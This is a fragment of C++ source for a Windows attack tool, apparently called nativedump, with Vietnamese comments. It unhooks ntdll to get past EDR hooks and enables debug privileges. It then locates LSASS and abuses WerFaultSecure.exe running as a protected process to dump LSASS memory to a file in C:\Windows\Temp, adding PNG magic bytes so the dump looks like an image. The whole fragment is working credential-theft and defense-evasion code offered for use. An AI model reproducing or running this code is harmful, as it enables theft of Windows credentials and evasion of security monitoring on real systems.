    BYTE png[4] = { 0x89,0x50,0x4E,0x47 }; DWORD wr = 0;
    WriteFile(hDump, png, 4, &wr, NULL);
    printf("[+] PNG magic written.\n");

    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CloseHandle(hDump); CloseHandle(hEnc); CloseHandle(hCancel);
    DeleteFileW(encPath.c_str());
    return TRUE;
}

// ============================================================
// main
// Usage: nativedump.exe [none|disk|knowndlls|debugproc]
//   none/default : chỉ dùng KnownDlls+disk unhook engine mới
//   disk         : thêm replace ntdll từ disk (legacy)
//   knowndlls    : thêm replace ntdll từ KnownDlls (legacy)
// ============================================================
int main(int argc, char* argv[]) {
    const char* opt = (argc >= 2) ? argv[1] : "none";

    initializeFunctions();

    // Unhook TRƯỚC khi làm bất cứ điều gì khác
    // EDR hook có thể chặn cả EnableDebugPrivileges nếu unhook sau
    PerformFullUnhook();

    EnableDebugPrivileges();

    printf("[*] Looking for LSASS...\n");
    DWORD pid = GetLsassPid();
    if (!pid) { printf("[-] LSASS not found\n"); return 1; }
    printf("[+] LSASS PID: %lu\n", pid);

    DWORD tid = GetMainThreadId(pid);
    if (!tid) { printf("[-] LSASS TID not found\n"); return 1; }
    printf("[+] LSASS TID: %lu\n", tid);

    std::wstring wer = L".\\WerFaultSecure.exe";
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExW(wer.c_str(), GetFileExInfoStandard, &fad)) {
        wer = L".\\WerFaultSecure.exe";
        if (!GetFileAttributesExW(wer.c_str(), GetFileExInfoStandard, &fad)) {
            printf("[-] WerFaultSecure.exe not found\n"); return 1;
        }
    }
    printf("[+] WerFaultSecure: %ws\n", wer.c_str());

    const wchar_t* outPath = L"C:\\Windows\\Temp\\lsass_dump.png";
    printf("[*] Spawning WerFaultSecure as PPL...\n");
    bool ok = SpawnWerFaultSecurePPL(wer, pid, tid, outPath, DUMP_TYPE_DEFAULT);
    printf(ok ? "[+] Done: %ws\n" : "[-] Failed.\n", outPath);
    return ok ? 0 : 1;
}